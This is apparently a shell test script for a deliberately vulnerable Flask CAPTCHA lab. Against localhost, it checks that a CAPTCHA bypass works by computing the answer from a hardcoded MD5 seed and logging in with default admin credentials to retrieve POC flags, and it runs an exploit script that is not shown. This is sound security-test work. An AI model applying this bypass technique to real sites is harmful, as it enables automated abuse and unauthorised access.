#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")
PORT=8111
BASE="http://127.0.0.1:$PORT"
FAIL=0

cleanup() { $DC down --remove-orphans 2>/dev/null || true; }
trap cleanup EXIT

echo "[*] Building container..."
$DC up --build -d

echo "[*] Waiting for Flask on port $PORT..."
for i in $(seq 1 30); do
  curl -sf "$BASE/" >/dev/null 2>&1 && break
  sleep 2
  if [ "$i" -eq 30 ]; then echo "[FAIL] Service timed out"; $DC logs; exit 1; fi
done
echo "[*] Service ready"

echo ""
echo "[*] Test 1: home page"
OUT=$(curl -sf "$BASE/")
if echo "$OUT" | grep -qi "CaptchaApp"; then echo "[PASS] Home page contains CaptchaApp"
else echo "[FAIL] Home page missing CaptchaApp"; FAIL=1; fi

echo ""
echo "[*] Test 2: CAPTCHA endpoint returns token and flag1"
OUT=$(curl -sf "$BASE/captcha")
if echo "$OUT" | grep -qE '"POC\{[0-9a-f]+\}"'; then echo "[PASS] CAPTCHA endpoint returned flag1"
else echo "[FAIL] CAPTCHA endpoint did not return flag1: $OUT"; FAIL=1; fi

echo ""
echo "[*] Test 3: wrong CAPTCHA rejected"
STATUS=$(curl -so /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123","captcha_token":"bad","captcha_answer":"000000"}' "$BASE/login")
if [ "$STATUS" = "403" ]; then echo "[PASS] Wrong CAPTCHA returns 403"
else echo "[FAIL] Expected 403, got $STATUS"; FAIL=1; fi

echo ""
echo "[*] Test 4: bypass CAPTCHA with computed answer"
CAPTCHA_OUT=$(curl -sf "$BASE/captcha")
TOKEN=$(echo "$CAPTCHA_OUT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
ANSWER=$(python3 -c "import hashlib; print(hashlib.md5('captcha-seed-2024'.encode()).hexdigest()[:6])")
OUT=$(curl -sf -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"password\":\"admin123\",\"captcha_token\":\"$TOKEN\",\"captcha_answer\":\"$ANSWER\"}" \
  "$BASE/login")
if echo "$OUT" | grep -qE '"POC\{[0-9a-f]+\}"'; then echo "[PASS] CAPTCHA bypass returned flag2"
else echo "[FAIL] CAPTCHA bypass did not return flag2: $OUT"; FAIL=1; fi

echo ""
echo "[*] Test 5: automated exploit"
EXPLOIT_OUT=$(python3 exploit/exploit.py "$BASE" 2>&1)
echo "$EXPLOIT_OUT"
FLAG_COUNT=$(echo "$EXPLOIT_OUT" | grep -cE 'POC\{[0-9a-f]+\}' || true)
if [ "$FLAG_COUNT" -ge 2 ]; then echo "[PASS] Exploit returned both flags"
else echo "[FAIL] Exploit did not return 2 POC flags"; FAIL=1; fi

echo ""
if [ "$FAIL" -eq 0 ]; then echo "[PASS] All tests passed"; exit 0
else echo "[FAIL] One or more tests failed"; exit 1; fi
